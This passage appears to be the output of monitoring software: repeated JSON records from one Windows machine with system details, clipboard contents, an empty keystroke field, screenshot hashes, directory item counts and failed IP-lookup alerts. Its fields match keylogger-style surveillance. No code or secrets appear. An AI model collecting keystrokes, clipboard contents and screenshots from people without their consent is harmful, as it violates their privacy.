"e530d50a5df32df9531cd3bdc0cae2a5149ff2d767983051c7f3987a33f78651", "_raw_log_hash": "0f575296f030bcaee342caf9999e586454e837204a877f76930a2f9f5c8046ed"}
{"timestamp": "2025-06-14T06:37:26.491415+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33CF50>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "e663bbef4822a633fd856da320f88b18c4fe0e5de4b5f4ca27d27343c35e87b7", "_raw_log_hash": "b70afe20b34c59a4bdb0dd099962cadacb1f6633f302bfc8624b517359c8988c"}
{"timestamp": "2025-06-14T06:37:39.966259+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33D590>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "9e6f8842a0e750347c5114dbace1a533a86ff2ae69b65f500012597a34c23061", "_raw_log_hash": "69523b1245b257b721a9cdd8b10fc947222846cf0c27662a8edc513486277e89"}
{"timestamp": "2025-06-14T06:37:53.427657+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33F110>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "2c2aad4a0a22ee6feb331ba4b3eece7fa29862ad60d93bd8106f38c6419d31c6", "_raw_log_hash": "6a12e2252c72e410eab21ca8b16af6d3c13b3b3d8de869ffc06d3a84e51c3a3d"}
{"timestamp": "2025-06-14T06:38:06.954890+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33CB90>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "d0c1c33f430b2f3f4c2bba4e2e1c4e56b51510dc06b8dd269ca8e80032b43e2d", "_raw_log_hash": "77b1b4a0d06974f8c9a61aaef6efcb743cca28bc7b60694bcad4723298de560c"}
{"timestamp": "2025-06-14T06:38:20.492733+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "45bd405b4f56884cb2b82db5e7b3a5dbf2c699dbbca500fc440d6eb802ea0b7b", "_raw_log_hash": "78483e440ddadc52b5e21c51f34e0ed3c930220dc347a45bb6c05e131fae75a1"}
{"timestamp": "2025-06-14T06:38:34.334850+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33C910>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "6925ddef453f8cf63f7418ddc24e28a05214b8cd5eba2171d96b24599da4c895", "_raw_log_hash": "6f1529c39cbd67353867f7a6a32676a250b0d3b0651027782a8e18ef7a9dac9f"}
{"timestamp": "2025-06-14T06:38:47.859740+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137C50>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "f0a7949d5967c5a3719b9d6d4745c7eff881ffbeff476171e17121b026afd773", "_raw_log_hash": "18f525786dfa81d8c411d28b780cae22daa3555ec9589cbfc960ca983e94c2b3"}
{"timestamp": "2025-06-14T06:39:01.358245+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "566a87879fca65cab73c17e6d16a4f522060a810c72d9e2c84367e02c05ba7d1", "_raw_log_hash": "bc56fadf86beb3a7210e0a2d66f6abea2963d118ea2d86e6a3fc7e4ec6ff0517"}
{"timestamp": "2025-06-14T06:39:14.850213+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33ED50>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "5aa4c704671660d14df669234d4dc33720f2bab954abfcea2c4c7eef8989fa31", "_raw_log_hash": "b03d31a2cbaceb4eeea85a885370ccb5e579e05b998e9efff53f69b9e0ff3969"}
{"timestamp": "2025-06-14T06:39:28.385519+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "94a235115d70c76c9dcd082b703578bd8d58664e98dd83017760ac830b19cec3", "_raw_log_hash": "ab14f6bb32316a0aa84d7a32fa4292b6ae4a9c2c3e59080c6bb6417508c92d34"}
{"timestamp": "2025-06-14T06:39:41.877691+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "24a4389b9a2ff091be7e8bcb095320eb4c46e01b5cbac859307ab05ac11e3604", "_raw_log_hash": "b8597e717e623c967579ad3d2a566cfde34c29cd02817eb2efac625cdbf09c9c"}
{"timestamp": "2025-06-14T06:39:55.397457+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33F250>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "b81961abf95dedfff9fcae5d1ee02d8aef6d0b6e9a77ca1a1d7e5e6c7914e298", "_raw_log_hash": "5b085c8b817ca50633add78a8d43f51d01c6e3191e409cf2b909111593809031"}
{"timestamp": "2025-06-14T06:40:08.933875+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137D90>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "35549b2d1cf7f71c6a4e1d7f0e12d9c30fad15ee1dad90fe5dca1ae39a4fea01", "_raw_log_hash": "fb226e82516453c8fccb910053b18e071efa22a2ac52b76804bdfd965031b580"}
{"timestamp": "2025-06-14T06:40:22.422392+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "fe77599af6bd2c70ece718ad5f145a5ebafd9388f0a8b512f36535165ed5e72e", "_raw_log_hash": "5647231ddcf49a43f1518ab57cffd25b579bce70d7cc4ab9e9478cb3bd15981c"}
{"timestamp": "2025-06-14T06:40:35.930246+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33C690>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "be7a730f3f4dff4881f11fd928af56d304f1165a4a4e877c053d65d9fda60221", "_raw_log_hash": "5b8d05f4ce814a920d23038a1dd89950f32272a2a087fdd88cf96c61b534d237"}
{"timestamp": "2025-06-14T06:40:49.605326+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "7866981c2f364aa7e2dadcb3b69d1ed1a7663953a3fa04ab6720039c8ddd3c7a", "_raw_log_hash": "316548938abadfd7ba9c1dc5884934f11cd3ad71fd59706348f1a35e91154925"}
{"timestamp": "2025-06-14T06:41:03.163439+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "2db0c166a9767ec9c285c80ece1ec9c3b3c7c1ad82b534434dbd259336dac996", "_raw_log_hash": "9fbc397eea00df78ba2ae0108bef90751c34b0a3c973c42429b6cb521ac6db72"}
{"timestamp": "2025-06-14T06:41:16.708673+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33CB90>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "ec30dda44eab835cdd29e67f7f86706318da11ac76f7fd9bab48c573edc79c18", "_raw_log_hash": "e70227e737d5aa79daa8b4977d9554f7b240823b9e57acb399c7663621766710"}
{"timestamp": "2025-06-14T06:41:30.229605+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137C50>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "7b19df904e8beb727539dfe1035839f5758508669ba45550aa3be35363cb9813", "_raw_log_hash": "f108041c2563c8edce0d1461d24d032d25664f746dfb0a2979f115d2ee66e463"}
{"timestamp": "2025-06-14T06:41:43.863856+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "4b963754ac6b11c85ca15cedd77b9c69ef1522dfb11a36ac04bc860abc82ec9c", "_raw_log_hash": "6d487ebf87ae85847a747c751034e7637453dd33e1a870877d02424c66646f55"}
{"timestamp": "2025-06-14T06:41:57.446946+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33CE10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "1626f0d6ff9bcb918c5db658808db2275dd2696a27dd41d33b5f97300ec73591", "_raw_log_hash": "0f893bf60f62b50594377cac4aab5c18d538ec8e84c44f1a473ccbe745d227ac"}
{"timestamp": "2025-06-14T06:42:10.932550+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "3cf86a9cb56cb4e2da9780618ea475e22ea94718eb1e6f31d2607dc90f3ee4a6", "_raw_log_hash": "1cf5d676f260ccc3474f9fc510e5c972361b404ab76f9c18e03fdc02af58602f"}
{"timestamp": "2025-06-14T06:42:24.428360+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "62bb7e4d5daf3682613203d769dd2d4bbfcfacb5595625a72c6a16aec4c7a70b", "_raw_log_hash": "d0dfc56e52bf632ed7a7cf8b3ecb13c6fd6d83a785afaaf5dde12cd48e4ce6aa"}
{"timestamp": "2025-06-14T06:42:38.003521+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33C910>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "d012711856a9468475beee78993c80056cc8ca0c17323dbfe68b621ce41f8145", "_raw_log_hash": "0d242d14ce1e9347655093dd8c064f7fad31b9cf6440a01970dc5121d143b358"}
{"timestamp": "2025-06-14T06:42:51.484505+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137D90>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "f9997672166fa89339a02c52dffdff534906564080f808ecdfc46afe503b4850", "_raw_log_hash": "18f06b66a9451e782471a3ede60598e06773e97dc0bacba8a1739ae73d3d018a"}
{"timestamp": "2025-06-14T06:43:04.994447+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "b1f893577fd2cb862f8f8bff4686079bff7f03a47b29e13ca5eac7e038004534", "_raw_log_hash": "0d2525c6d074a76541aae494e0046a46ad6d68dbbcf24bdc22c651f0dbee9554"}
